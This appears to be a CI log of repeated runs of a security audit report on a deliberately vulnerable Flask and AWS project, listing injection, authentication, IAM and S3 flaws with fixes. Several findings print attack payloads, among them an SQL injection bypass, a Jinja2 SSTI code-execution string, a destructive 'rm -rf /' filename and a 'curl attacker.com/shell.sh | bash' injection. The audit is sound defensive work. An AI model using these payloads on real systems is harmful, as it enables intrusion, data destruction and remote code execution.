+2026-08-24T17:56:46.8948559Z Use a secrets manager (AWS Secrets Manager, HashiCorp Vault) in production and a `.env` file (git-ignored) in development.
+2026-08-24T17:56:46.8948976Z 
+2026-08-24T17:56:46.8949053Z ---
+2026-08-24T17:56:46.8949239Z 
+2026-08-24T17:56:46.8949408Z ### 6. No Authentication or Authorisation on Any Route
+2026-08-24T17:56:46.8949886Z **Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+2026-08-24T17:56:46.8950319Z **Severity:** High
+2026-08-24T17:56:46.8950483Z 
+2026-08-24T17:56:46.8950957Z Every endpoint — including user deletion, file processing, and template rendering — is completely unauthenticated. Any anonymous request can:
+2026-08-24T17:56:46.8951540Z - List all users and their emails (`GET /users/`)
+2026-08-24T17:56:46.8952174Z - Delete any user (`DELETE /users/delete/<username>`)
+2026-08-24T17:56:46.8952566Z - Delete any file (`DELETE /files/delete/<file_id>`)
+2026-08-24T17:56:46.8952947Z - Execute server-side templates (see SSTI above)
+2026-08-24T17:56:46.8953179Z 
+2026-08-24T17:56:46.8953387Z **Fix:** Implement a JWT verification decorator and apply it to protected routes:
+2026-08-24T17:56:46.8953778Z ```python
+2026-08-24T17:56:46.8954084Z import jwt
+2026-08-24T17:56:46.8954370Z from functools import wraps
+2026-08-24T17:56:46.8954685Z from flask import request, jsonify
+2026-08-24T17:56:46.8954897Z 
+2026-08-24T17:56:46.8955002Z def require_auth(f):
+2026-08-24T17:56:46.8955356Z     @wraps(f)
+2026-08-24T17:56:46.8955649Z     def decorated(*args, **kwargs):
+2026-08-24T17:56:46.8956116Z         token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+2026-08-24T17:56:46.8956534Z         if not token:
+2026-08-24T17:56:46.8956843Z             return jsonify({"error": "Missing token"}), 401
+2026-08-24T17:56:46.8957160Z         try:
+2026-08-24T17:56:46.8957569Z             payload = jwt.decode(token, os.environ["JWT_SECRET"], algorithms=["HS256"])
+2026-08-24T17:56:46.8958032Z             request.user_id = payload["user_id"]
+2026-08-24T17:56:46.8958386Z         except jwt.ExpiredSignatureError:
+2026-08-24T17:56:46.8958739Z             return jsonify({"error": "Token expired"}), 401
+2026-08-24T17:56:46.8959080Z         except jwt.InvalidTokenError:
+2026-08-24T17:56:46.8959465Z             return jsonify({"error": "Invalid token"}), 401
+2026-08-24T17:56:46.8959886Z         return f(*args, **kwargs)
+2026-08-24T17:56:46.8960225Z     return decorated
+2026-08-24T17:56:46.8960369Z 
+2026-08-24T17:56:46.8960504Z # Apply to routes:
+2026-08-24T17:56:46.8960810Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:56:46.8961209Z @require_auth
+2026-08-24T17:56:46.8961474Z def delete_user(username):
+2026-08-24T17:56:46.8962029Z     ...
+2026-08-24T17:56:46.8962285Z ```
+2026-08-24T17:56:46.8962398Z 
+2026-08-24T17:56:46.8962509Z ---
+2026-08-24T17:56:46.8962713Z 
+2026-08-24T17:56:46.8962825Z ### 7. Overly Permissive IAM Policy
+2026-08-24T17:56:46.8963159Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:56:46.8963478Z **Severity:** High
+2026-08-24T17:56:46.8963657Z 
+2026-08-24T17:56:46.8963783Z ```json
+2026-08-24T17:56:46.8964009Z {
+2026-08-24T17:56:46.8964308Z     "Sid": "AdministratorAccess",
+2026-08-24T17:56:46.8964608Z     "Effect": "Allow",
+2026-08-24T17:56:46.8964875Z     "Action": "*",
+2026-08-24T17:56:46.8965145Z     "Resource": "*"
+2026-08-24T17:56:46.8965442Z }
+2026-08-24T17:56:46.8965704Z ```
+2026-08-24T17:56:46.8965812Z 
+2026-08-24T17:56:46.8966902Z The first statement grants full administrator access to every AWS service and resource. The subsequent, more restrictive statements are entirely redundant — the wildcard already covers everything. This violates the principle of least privilege and means a compromised identity has unrestricted access to the entire AWS account.
+2026-08-24T17:56:46.8967860Z 
+2026-08-24T17:56:46.8968149Z **Fix:** Remove the wildcard statement entirely and grant only the specific permissions actually required:
+2026-08-24T17:56:46.8968661Z ```json
+2026-08-24T17:56:46.8968903Z {
+2026-08-24T17:56:46.8969177Z     "Version": "2012-10-17",
+2026-08-24T17:56:46.8969459Z     "Statement": [
+2026-08-24T17:56:46.8969711Z         {
+2026-08-24T17:56:46.8969982Z             "Sid": "AllowEC2Describe",
+2026-08-24T17:56:46.8970333Z             "Effect": "Allow",
+2026-08-24T17:56:46.8970639Z             "Action": [
+2026-08-24T17:56:46.8972326Z                 "ec2:DescribeInstances",
+2026-08-24T17:56:46.8972674Z                 "ec2:DescribeSecurityGroups",
+2026-08-24T17:56:46.8973015Z                 "ec2:DescribeVpcs"
+2026-08-24T17:56:46.8973329Z             ],
+2026-08-24T17:56:46.8973632Z             "Resource": "*"
+2026-08-24T17:56:46.8973905Z         },
+2026-08-24T17:56:46.8974148Z         {
+2026-08-24T17:56:46.8974414Z             "Sid": "AllowS3ReadAccess",
+2026-08-24T17:56:46.8974773Z             "Effect": "Allow",
+2026-08-24T17:56:46.8975133Z             "Action": ["s3:GetObject", "s3:ListBucket"],
+2026-08-24T17:56:46.8975698Z             "Resource": "arn:aws:s3:::dissertation-bucket/*"
+2026-08-24T17:56:46.8976067Z         }
+2026-08-24T17:56:46.8976334Z     ]
+2026-08-24T17:56:46.8976614Z }
+2026-08-24T17:56:46.8976875Z ```
+2026-08-24T17:56:46.8977026Z 
+2026-08-24T17:56:46.8977130Z ---
+2026-08-24T17:56:46.8977285Z 
+2026-08-24T17:56:46.8977439Z ### 8. Publicly Accessible S3 Bucket
+2026-08-24T17:56:46.8977792Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:56:46.8978143Z **Severity:** High
+2026-08-24T17:56:46.8978317Z 
+2026-08-24T17:56:46.8978530Z ```hcl
+2026-08-24T17:56:46.8978879Z resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+2026-08-24T17:56:46.8979335Z   block_public_acls       = false
+2026-08-24T17:56:46.8979693Z   block_public_policy     = false
+2026-08-24T17:56:46.8980019Z   ignore_public_acls      = false
+2026-08-24T17:56:46.8980352Z   restrict_public_buckets = false
+2026-08-24T17:56:46.8980651Z }
+2026-08-24T17:56:46.8980881Z ```
+2026-08-24T17:56:46.8981064Z 
+2026-08-24T17:56:46.8981619Z All four public access block settings are disabled, meaning the bucket and its contents can be made world-readable. S3 misconfigurations are a leading cause of data breaches.
+2026-08-24T17:56:46.8982268Z 
+2026-08-24T17:56:46.8982573Z **Fix:** Unless serving a static website with a deliberate public policy, block all public access:
+2026-08-24T17:56:46.8983070Z ```hcl
+2026-08-24T17:56:46.8983415Z resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+2026-08-24T17:56:46.8983963Z   block_public_acls       = true
+2026-08-24T17:56:46.8984326Z   block_public_policy     = true
+2026-08-24T17:56:46.8984779Z   ignore_public_acls      = true
+2026-08-24T17:56:46.8985289Z   restrict_public_buckets = true
+2026-08-24T17:56:46.8986047Z }
+2026-08-24T17:56:46.8986449Z ```
+2026-08-24T17:56:46.8986663Z 
+2026-08-24T17:56:46.8986792Z ---
+2026-08-24T17:56:46.8986913Z 
+2026-08-24T17:56:46.8987100Z ### 9. EC2 Instance Metadata Service (IMDSv1) Enabled
+2026-08-24T17:56:46.8987488Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:56:46.8987811Z **Severity:** High
+2026-08-24T17:56:46.8987987Z 
+2026-08-24T17:56:46.8988073Z ```hcl
+2026-08-24T17:56:46.8988395Z metadata_options {
+2026-08-24T17:56:46.8988736Z   http_endpoint               = "enabled"
+2026-08-24T17:56:46.8989134Z   http_tokens                 = "optional"  # IMDSv1 allowed
+2026-08-24T17:56:46.8989526Z   http_put_response_hop_limit = 1
+2026-08-24T17:56:46.8989844Z }
+2026-08-24T17:56:46.8990123Z ```
+2026-08-24T17:56:46.8990277Z 
+2026-08-24T17:56:46.8991088Z `http_tokens = "optional"` allows IMDSv1, which requires no authentication token. Combined with an SSRF vulnerability in the application, an attacker can query `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal the instance's IAM credentials.
+2026-08-24T17:56:46.8992048Z 
+2026-08-24T17:56:46.8992249Z **Fix:** Enforce IMDSv2 (token-required):
+2026-08-24T17:56:46.8992580Z ```hcl
+2026-08-24T17:56:46.8992849Z metadata_options {
+2026-08-24T17:56:46.8993183Z   http_endpoint               = "enabled"
+2026-08-24T17:56:46.8993603Z   http_tokens                 = "required"  # IMDSv2 only
+2026-08-24T17:56:46.8993995Z   http_put_response_hop_limit = 1
+2026-08-24T17:56:46.8994304Z }
+2026-08-24T17:56:46.8994558Z ```
+2026-08-24T17:56:46.8994737Z 
+2026-08-24T17:56:46.8994838Z ---
+2026-08-24T17:56:46.8994992Z 
+2026-08-24T17:56:46.8995112Z ## Medium Vulnerabilities
+2026-08-24T17:56:46.8995293Z 
+2026-08-24T17:56:46.8995450Z ---
+2026-08-24T17:56:46.8995571Z 
+2026-08-24T17:56:46.8995725Z ### 10. Unencrypted S3 Bucket
+2026-08-24T17:56:46.8996247Z **File:** `./infrastructure/main.tf` — `dissertation-unencrypted-bucket`
+2026-08-24T17:56:46.8996700Z **Severity:** Medium
+2026-08-24T17:56:46.8996885Z 
+2026-08-24T17:56:46.8996987Z ```hcl
+2026-08-24T17:56:46.8997329Z resource "aws_s3_bucket" "unencrypted_bucket" {
+2026-08-24T17:56:46.8997727Z   bucket = "dissertation-unencrypted-bucket"
+2026-08-24T17:56:46.8998077Z }
+2026-08-24T17:56:46.8998381Z # No encryption configuration attached
+2026-08-24T17:56:46.8998701Z ```
+2026-08-24T17:56:46.8998836Z 
+2026-08-24T17:56:46.8999252Z Data stored in this bucket is not encrypted at rest, violating most compliance frameworks (PCI-DSS, HIPAA, GDPR).
+2026-08-24T17:56:46.8999640Z 
+2026-08-24T17:56:46.9000040Z **Fix:** Add server-side encryption (note AWS now enables SSE-S3 by default for new buckets, but it should be explicit in IaC):
+2026-08-24T17:56:46.9000581Z ```hcl
+2026-08-24T17:56:46.9001043Z resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+2026-08-24T17:56:46.9001904Z   bucket = aws_s3_bucket.unencrypted_bucket.id
+2026-08-24T17:56:46.9002323Z   rule {
+2026-08-24T17:56:46.9002649Z     apply_server_side_encryption_by_default {
+2026-08-24T17:56:46.9002994Z       sse_algorithm = "AES256"
+2026-08-24T17:56:46.9003320Z     }
+2026-08-24T17:56:46.9003578Z   }
+2026-08-24T17:56:46.9003834Z }
+2026-08-24T17:56:46.9004147Z ```
+2026-08-24T17:56:46.9004265Z 
+2026-08-24T17:56:46.9004382Z ---
+2026-08-24T17:56:46.9004517Z 
+2026-08-24T17:56:46.9004693Z ### 11. No Input Validation on File Upload
+2026-08-24T17:56:46.9005142Z **File:** `./app/routes/files.py` — `upload_file()`
+2026-08-24T17:56:46.9005512Z **Severity:** Medium
+2026-08-24T17:56:46.9005736Z 
+2026-08-24T17:56:46.9005842Z ```python
+2026-08-24T17:56:46.9006149Z filename = data.get("filename")
+2026-08-24T17:56:46.9006585Z file_record = File(filename=filename, uploaded_by=uploaded_by)
+2026-08-24T17:56:46.9007011Z ```
+2026-08-24T17:56:46.9007152Z 
+2026-08-24T17:56:46.9007679Z No validation is performed on `filename`. This enables path traversal payloads (`../../etc/passwd`) to be stored in the database and later used in the command injection sink in `process_file()`.
+2026-08-24T17:56:46.9008254Z 
+2026-08-24T17:56:46.9008382Z **Fix:**
+2026-08-24T17:56:46.9008702Z ```python
+2026-08-24T17:56:46.9008962Z import os
+2026-08-24T17:56:46.9009205Z import re
+2026-08-24T17:56:46.9009370Z 
+2026-08-24T17:56:46.9009512Z SAFE_FILENAME_RE = re.compile(r'^[\w\-. ]+$')
+2026-08-24T17:56:46.9009734Z 
+2026-08-24T17:56:46.9009847Z filename = data.get("filename", "")
+2026-08-24T17:56:46.9010228Z if not filename or not SAFE_FILENAME_RE.match(filename):
+2026-08-24T17:56:46.9010626Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:56:46.9011034Z filename = os.path.basename(filename)  # Strip any path components
+2026-08-24T17:56:46.9011430Z ```
+2026-08-24T17:56:46.9011572Z 
+2026-08-24T17:56:46.9011665Z ---
+2026-08-24T17:56:46.9011885Z 
+2026-08-24T17:56:46.9012049Z ### 12. Unauthenticated Access to All User Data
+2026-08-24T17:56:46.9012479Z **File:** `./app/routes/users.py` — `get_all_users()`
+2026-08-24T17:56:46.9012826Z **Severity:** Medium
+2026-08-24T17:56:46.9012999Z 
+2026-08-24T17:56:46.9013105Z ```python
+2026-08-24T17:56:46.9013370Z @users_bp.route("/", methods=["GET"])
+2026-08-24T17:56:46.9013709Z def get_all_users():
+2026-08-24T17:56:46.9013994Z     users = User.query.all()
+2026-08-24T17:56:46.9014433Z     return jsonify([{"id": u.id, "username": u.username, "email": u.email, "role": u.role} ...])
+2026-08-24T17:56:46.9014860Z ```
+2026-08-24T17:56:46.9015000Z 
+2026-08-24T17:56:46.9015344Z Any unauthenticated request to `GET /users/` returns the full user list including emails and roles. This is a mass data exposure risk.
+2026-08-24T17:56:46.9015779Z 
+2026-08-24T17:56:46.9016045Z **Fix:** Require authentication (see issue #6) and restrict this endpoint to admin roles only.
+2026-08-24T17:56:46.9016357Z 
+2026-08-24T17:56:46.9016482Z ---
+2026-08-24T17:56:46.9016595Z 
+2026-08-24T17:56:46.9016787Z ### 13. SecretsManager `DeleteSecret` Permission
+2026-08-24T17:56:46.9017321Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:56:46.9017779Z **Severity:** Medium
+2026-08-24T17:56:46.9017944Z 
+2026-08-24T17:56:46.9018072Z ```json
+2026-08-24T17:56:46.9018317Z {
+2026-08-24T17:56:46.9018595Z     "Sid": "SecretsManagerAccess",
+2026-08-24T17:56:46.9018910Z     "Action": [
+2026-08-24T17:56:46.9019192Z         "secretsmanager:GetSecretValue",
+2026-08-24T17:56:46.9019512Z         "secretsmanager:ListSecrets",
+2026-08-24T17:56:46.9019895Z         "secretsmanager:DeleteSecret"
+2026-08-24T17:56:46.9020214Z     ],
+2026-08-24T17:56:46.9020478Z     "Resource": "*"
+2026-08-24T17:56:46.9020782Z }
+2026-08-24T17:56:46.9021147Z ```
+2026-08-24T17:56:46.9021332Z 
+2026-08-24T17:56:46.9022168Z Granting `DeleteSecret` on `Resource: "*"` allows the identity to permanently destroy any secret in the account. This is a destructive permission that should almost never be granted to application roles.
+2026-08-24T17:56:46.9023018Z 
+2026-08-24T17:56:46.9023555Z **Fix:** Remove `DeleteSecret` and scope the resource ARN to only the secrets this application needs:
+2026-08-24T17:56:46.9024056Z ```json
+2026-08-24T17:56:46.9024413Z {
+2026-08-24T17:56:46.9024668Z     "Action": ["secretsmanager:GetSecretValue"],
+2026-08-24T17:56:46.9025346Z     "Resource": "arn:aws:secretsmanager:eu-west-2:123456789012:secret:dissertation/*"
+2026-08-24T17:56:46.9025968Z }
+2026-08-24T17:56:46.9026210Z ```
+2026-08-24T17:56:46.9026342Z 
+2026-08-24T17:56:46.9026623Z ---
+2026-08-24T17:56:46.9026768Z 
+2026-08-24T17:56:46.9026901Z ### 14. Debug Mode Enabled in Production Entry Point
+2026-08-24T17:56:46.9027388Z **File:** `./run.py`
+2026-08-24T17:56:46.9027696Z **Severity:** Medium
+2026-08-24T17:56:46.9027858Z 
+2026-08-24T17:56:46.9028053Z ```python
+2026-08-24T17:56:46.9028365Z app.run(debug=True)
+2026-08-24T17:56:46.9028666Z ```
+2026-08-24T17:56:46.9029043Z 
+2026-08-24T17:56:46.9029684Z Flask's debug mode enables the interactive Werkzeug debugger, which provides a Python REPL in the browser on any unhandled exception. This allows arbitrary code execution if the application is accidentally run with this file in production.
+2026-08-24T17:56:46.9030499Z 
+2026-08-24T17:56:46.9030631Z **Fix:**
+2026-08-24T17:56:46.9030890Z ```python
+2026-08-24T17:56:46.9031154Z if __name__ == "__main__":
+2026-08-24T17:56:46.9031500Z     debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+2026-08-24T17:56:46.9032031Z     app.run(debug=debug)
+2026-08-24T17:56:46.9032308Z ```
+2026-08-24T17:56:46.9032443Z 
+2026-08-24T17:56:46.9032602Z ---
+2026-08-24T17:56:46.9032716Z 
+2026-08-24T17:56:46.9032854Z ## Low Vulnerabilities
+2026-08-24T17:56:46.9033003Z 
+2026-08-24T17:56:46.9033114Z ---
+2026-08-24T17:56:46.9033304Z 
+2026-08-24T17:56:46.9033434Z ### 15. JWT Algorithm Not Validated on Decode
+2026-08-24T17:56:46.9033770Z **File:** `./app/routes/auth.py`
+2026-08-24T17:56:46.9034111Z **Severity:** Low
+2026-08-24T17:56:46.9034251Z 
+2026-08-24T17:56:46.9034943Z The `generate_token` function specifies `HS256`, but there is no corresponding `decode` call in the codebase that enforces the algorithm. If a decode is added later without specifying `algorithms=["HS256"]`, it may be vulnerable to the `alg: none` attack.
+2026-08-24T17:56:46.9037758Z 
+2026-08-24T17:56:46.9037949Z **Fix:** Always explicitly specify allowed algorithms when decoding:
+2026-08-24T17:56:46.9038350Z ```python
+2026-08-24T17:56:46.9038676Z jwt.decode(token, secret, algorithms=["HS256"])
+2026-08-24T17:56:46.9039011Z ```
+2026-08-24T17:56:46.9039124Z 
+2026-08-24T17:56:46.9039257Z ---
+2026-08-24T17:56:46.9039422Z 
+2026-08-24T17:56:46.9039550Z ### 16. No Rate Limiting on Authentication Endpoints
+2026-08-24T17:56:46.9039920Z **File:** `./app/routes/auth.py`
+2026-08-24T17:56:46.9040220Z **Severity:** Low
+2026-08-24T17:56:46.9040373Z 
+2026-08-24T17:56:46.9040762Z The `/auth/login` and `/auth/register` endpoints have no rate limiting, enabling brute-force and credential-stuffing attacks.
+2026-08-24T17:56:46.9041160Z 
+2026-08-24T17:56:46.9041313Z **Fix:** Use `Flask-Limiter`:
+2026-08-24T17:56:46.9041612Z ```python
+2026-08-24T17:56:46.9042103Z from flask_limiter import Limiter
+2026-08-24T17:56:46.9042443Z from flask_limiter.util import get_remote_address
+2026-08-24T17:56:46.9042671Z 
+2026-08-24T17:56:46.9042941Z limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day"])
+2026-08-24T17:56:46.9043224Z 
+2026-08-24T17:56:46.9043384Z @auth_bp.route("/login", methods=["POST"])
+2026-08-24T17:56:46.9043737Z @limiter.limit("10 per minute")
+2026-08-24T17:56:46.9044060Z def login():
+2026-08-24T17:56:46.9044318Z     ...
+2026-08-24T17:56:46.9044606Z ```
+2026-08-24T17:56:46.9044718Z 
+2026-08-24T17:56:46.9044841Z ---
+2026-08-24T17:56:46.9044976Z 
+2026-08-24T17:56:46.9045136Z ### 17. Missing `null` Checks on Request Body Fields
+2026-08-24T17:56:46.9045612Z **Files:** `./app/routes/auth.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+2026-08-24T17:56:46.9046029Z **Severity:** Low
+2026-08-24T17:56:46.9046187Z 
+2026-08-24T17:56:46.9046337Z ```python
+2026-08-24T17:56:46.9046703Z data = request.get_json()
+2026-08-24T17:56:46.9047080Z username = data.get("username")  # data could be None if Content-Type is wrong
+2026-08-24T17:56:46.9047500Z ```
+2026-08-24T17:56:46.9047645Z 
+2026-08-24T17:56:46.9048133Z If the request body is not valid JSON, `get_json()` returns `None`, and calling `.get()` on `None` raises an unhandled `AttributeError`, potentially leaking stack trace information.
+2026-08-24T17:56:46.9048676Z 
+2026-08-24T17:56:46.9048834Z **Fix:**
+2026-08-24T17:56:46.9049100Z ```python
+2026-08-24T17:56:46.9049352Z data = request.get_json(silent=True)
+2026-08-24T17:56:46.9049687Z if not data:
+2026-08-24T17:56:46.9049993Z     return jsonify({"error": "Invalid JSON body"}), 400
+2026-08-24T17:56:46.9050328Z ```
+2026-08-24T17:56:46.9050506Z 
+2026-08-24T17:56:46.9050632Z ---
+2026-08-24T17:56:46.9050747Z 
+2026-08-24T17:56:46.9050866Z ## Summary Table
+2026-08-24T17:56:46.9051012Z 
+2026-08-24T17:56:46.9051231Z | # | File | Issue | Severity |
+2026-08-24T17:56:46.9051541Z |---|------|-------|----------|
+2026-08-24T17:56:46.9051958Z | 1 | `auth.py` | SQL Injection in login | **Critical** |
+2026-08-24T17:56:46.9052449Z | 2 | `templates.py` | Server-Side Template Injection | **Critical** |
+2026-08-24T17:56:46.9052863Z | 3 | `files.py` | OS Command Injection | **Critical** |
+2026-08-24T17:56:46.9053284Z | 4 | `auth.py` | Plaintext password storage | **Critical** |
+2026-08-24T17:57:49.4846048Z | 5 | `
+2026-08-24T17:57:49.4847166Z 
+2026-08-24T17:57:49.4848080Z === RUN 3 OF 5 ===
+2026-08-24T17:57:49.4848598Z # Security Audit Report
+2026-08-24T17:57:49.4849046Z 
+2026-08-24T17:57:49.4849451Z ## Critical Vulnerabilities
+2026-08-24T17:57:49.4849740Z 
+2026-08-24T17:57:49.4850023Z ---
+2026-08-24T17:57:49.4850254Z 
+2026-08-24T17:57:49.4850503Z ### 1. SQL Injection
+2026-08-24T17:57:49.4851367Z **File:** `./app/routes/auth.py` — `login()` function
+2026-08-24T17:57:49.4852362Z **Severity:** Critical
+2026-08-24T17:57:49.4852726Z 
+2026-08-24T17:57:49.4853197Z The login query is built via direct string concatenation with unsanitised user input:
+2026-08-24T17:57:49.4853729Z 
+2026-08-24T17:57:49.4853951Z ```python
+2026-08-24T17:57:49.4854343Z # VULNERABLE
+2026-08-24T17:57:49.4855098Z query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+2026-08-24T17:57:49.4855909Z result = db.session.execute(query)
+2026-08-24T17:57:49.4856426Z ```
+2026-08-24T17:57:49.4856629Z 
+2026-08-24T17:57:49.4857062Z An attacker can bypass authentication entirely with a payload like `' OR '1'='1' --`.
+2026-08-24T17:57:49.4857590Z 
+2026-08-24T17:57:49.4857823Z **Fix:** Use parameterised queries:
+2026-08-24T17:57:49.4858328Z ```python
+2026-08-24T17:57:49.4858770Z from sqlalchemy import text
+2026-08-24T17:57:49.4859076Z 
+2026-08-24T17:57:49.4859504Z result = db.session.execute(
+2026-08-24T17:57:49.4860000Z     text("SELECT * FROM users WHERE username = :username AND password = :password"),
+2026-08-24T17:57:49.4860512Z     {"username": username, "password": password}
+2026-08-24T17:57:49.4860943Z )
+2026-08-24T17:57:49.4861223Z ```
+2026-08-24T17:57:49.4861632Z Better still, use the ORM directly and store hashed passwords (see issue #3):
+2026-08-24T17:57:49.4862383Z ```python
+2026-08-24T17:57:49.4862716Z user = User.query.filter_by(username=username).first()
+2026-08-24T17:57:49.4863285Z if user and bcrypt.check_password_hash(user.password, password):
+2026-08-24T17:57:49.4863712Z     ...
+2026-08-24T17:57:49.4864402Z ```
+2026-08-24T17:57:49.4864594Z 
+2026-08-24T17:57:49.4864731Z ---
+2026-08-24T17:57:49.4864853Z 
+2026-08-24T17:57:49.4865020Z ### 2. Server-Side Template Injection (SSTI)
+2026-08-24T17:57:49.4865628Z **File:** `./app/routes/templates.py` — `render_template_custom()`
+2026-08-24T17:57:49.4866053Z **Severity:** Critical
+2026-08-24T17:57:49.4866226Z 
+2026-08-24T17:57:49.4866512Z User-supplied template strings are rendered directly by Jinja2 with no sandboxing:
+2026-08-24T17:57:49.4866896Z 
+2026-08-24T17:57:49.4867050Z ```python
+2026-08-24T17:57:49.4867304Z # VULNERABLE
+2026-08-24T17:57:49.4867985Z env = Environment()          # No sandbox
+2026-08-24T17:57:49.4868358Z template = env.from_string(template_str)
+2026-08-24T17:57:49.4868728Z rendered = template.render(**context)
+2026-08-24T17:57:49.4869071Z ```
+2026-08-24T17:57:49.4869232Z 
+2026-08-24T17:57:49.4869497Z An attacker can achieve Remote Code Execution (RCE) with a payload such as:
+2026-08-24T17:57:49.4869964Z ```
+2026-08-24T17:57:49.4870340Z {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+2026-08-24T17:57:49.4870790Z ```
+2026-08-24T17:57:49.4870951Z 
+2026-08-24T17:57:49.4871460Z **Fix:** Use Jinja2's `SandboxedEnvironment` and strictly validate/whitelist templates. If user-defined templates are not a core requirement, remove the endpoint entirely:
+2026-08-24T17:57:49.4872495Z ```python
+2026-08-24T17:57:49.4872851Z from jinja2.sandbox import SandboxedEnvironment
+2026-08-24T17:57:49.4873082Z 
+2026-08-24T17:57:49.4873248Z env = SandboxedEnvironment()
+2026-08-24T17:57:49.4873719Z template = env.from_string(template_str)
+2026-08-24T17:57:49.4874098Z rendered = template.render(**context)
+2026-08-24T17:57:49.4874471Z ```
+2026-08-24T17:57:49.4875087Z Note that even `SandboxedEnvironment` has had historical bypasses; the safest approach is to avoid rendering arbitrary user-supplied templates.
+2026-08-24T17:57:49.4875560Z 
+2026-08-24T17:57:49.4875692Z ---
+2026-08-24T17:57:49.4875828Z 
+2026-08-24T17:57:49.4875966Z ### 3. Plaintext Password Storage
+2026-08-24T17:57:49.4876392Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:57:49.4876786Z **Severity:** Critical
+2026-08-24T17:57:49.4876954Z 
+2026-08-24T17:57:49.4877167Z Passwords are stored in the database without any hashing:
+2026-08-24T17:57:49.4877412Z 
+2026-08-24T17:57:49.4877549Z ```python
+2026-08-24T17:57:49.4877808Z # VULNERABLE
+2026-08-24T17:57:49.4878421Z user = User(username=username, *** email=email)
+2026-08-24T17:57:49.4878805Z ```
+2026-08-24T17:57:49.4878951Z 
+2026-08-24T17:57:49.4879179Z A database breach exposes every user's password in plaintext.
+2026-08-24T17:57:49.4879469Z 
+2026-08-24T17:57:49.4879655Z **Fix:** Hash passwords before storage using `bcrypt` or `argon2`:
+2026-08-24T17:57:49.4880048Z ```python
+2026-08-24T17:57:49.4880366Z from flask_bcrypt import Bcrypt
+2026-08-24T17:57:49.4880703Z bcrypt = Bcrypt()
+2026-08-24T17:57:49.4880862Z 
+2026-08-24T17:57:49.4881014Z # On register:
+2026-08-24T17:57:49.4881369Z hashed = bcrypt.generate_password_hash(password).decode("utf-8")
+2026-08-24T17:57:49.4882059Z user = User(username=username, *** email=email)
+2026-08-24T17:57:49.4882328Z 
+2026-08-24T17:57:49.4882491Z # On login:
+2026-08-24T17:57:49.4882905Z if user and bcrypt.check_password_hash(user.password, password):
+2026-08-24T17:57:49.4883325Z     ...
+2026-08-24T17:57:49.4883580Z ```
+2026-08-24T17:57:49.4883714Z 
+2026-08-24T17:57:49.4883828Z ---
+2026-08-24T17:57:49.4884019Z 
+2026-08-24T17:57:49.4884137Z ### 4. OS Command Injection
+2026-08-24T17:57:49.4884562Z **File:** `./app/routes/files.py` — `process_file()`
+2026-08-24T17:57:49.4884955Z **Severity:** Critical
+2026-08-24T17:57:49.4885110Z 
+2026-08-24T17:57:49.4885355Z User-supplied `filename` is interpolated directly into a shell command:
+2026-08-24T17:57:49.4885656Z 
+2026-08-24T17:57:49.4885791Z ```python
+2026-08-24T17:57:49.4886084Z # VULNERABLE
+2026-08-24T17:57:49.4886504Z result = subprocess.run(
+2026-08-24T17:57:49.4886906Z     "file " + filename,   # shell=True makes this exploitable
+2026-08-24T17:57:49.4887279Z     shell=True,
+2026-08-24T17:57:49.4887558Z     ...
+2026-08-24T17:57:49.4887848Z )
+2026-08-24T17:57:49.4888100Z ```
+2026-08-24T17:57:49.4888257Z 
+2026-08-24T17:57:49.4888545Z An attacker can supply `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` as the filename.
+2026-08-24T17:57:49.4888870Z 
+2026-08-24T17:57:49.4889092Z **Fix:** Pass arguments as a list and disable shell interpolation:
+2026-08-24T17:57:49.4889487Z ```python
+2026-08-24T17:57:49.4889782Z import shlex
+2026-08-24T17:57:49.4889956Z 
+2026-08-24T17:57:49.4890071Z # Validate filename first
+2026-08-24T17:57:49.4890562Z if not re.match(r'^[\w\-. ]+$', filename):
+2026-08-24T17:57:49.4890945Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:57:49.4891169Z 
+2026-08-24T17:57:49.4891351Z result = subprocess.run(
+2026-08-24T17:57:49.4891805Z     ["file", filename],   # List form, no shell
+2026-08-24T17:57:49.4892261Z     shell=False,
+2026-08-24T17:57:49.4892598Z     capture_output=True,
+2026-08-24T17:57:49.4892895Z     text=True
+2026-08-24T17:57:49.4893194Z )
+2026-08-24T17:57:49.4893727Z ```
+2026-08-24T17:57:49.4893883Z 
+2026-08-24T17:57:49.4893982Z ---
+2026-08-24T17:57:49.4894135Z 
+2026-08-24T17:57:49.4894276Z ## High Severity Vulnerabilities
+2026-08-24T17:57:49.4894489Z 
+2026-08-24T17:57:49.4894620Z ---
+2026-08-24T17:57:49.4894762Z 
+2026-08-24T17:57:49.4894907Z ### 5. Hardcoded Secrets
+2026-08-24T17:57:49.4895255Z **Files:** `./app/config.py`, `./app/routes/auth.py`
+2026-08-24T17:57:49.4895612Z **Severity:** High
+2026-08-24T17:57:49.4895882Z 
+2026-08-24T17:57:49.4896062Z Multiple secrets are hardcoded directly in source code:
+2026-08-24T17:57:49.4896331Z 
+2026-08-24T17:57:49.4896485Z ```python
+2026-08-24T17:57:49.4896764Z # app/config.py
+2026-08-24T17:57:49.4897083Z SECRET_KEY = "hardcoded-secret-key-123"
+2026-08-24T17:57:49.4897320Z 
+2026-08-24T17:57:49.4897436Z # app/routes/auth.py
+2026-08-24T17:57:49.4897770Z db_password = "supersecretdbpassword123"
+2026-08-24T17:57:49.4898170Z secret = "jwt-secret-key-hardcoded-2024"
+2026-08-24T17:57:49.4898533Z ```
+2026-08-24T17:57:49.4898663Z 
+2026-08-24T17:57:49.4898958Z Anyone with read access to the repository (including historical commits) has these credentials.
+2026-08-24T17:57:49.4899307Z 
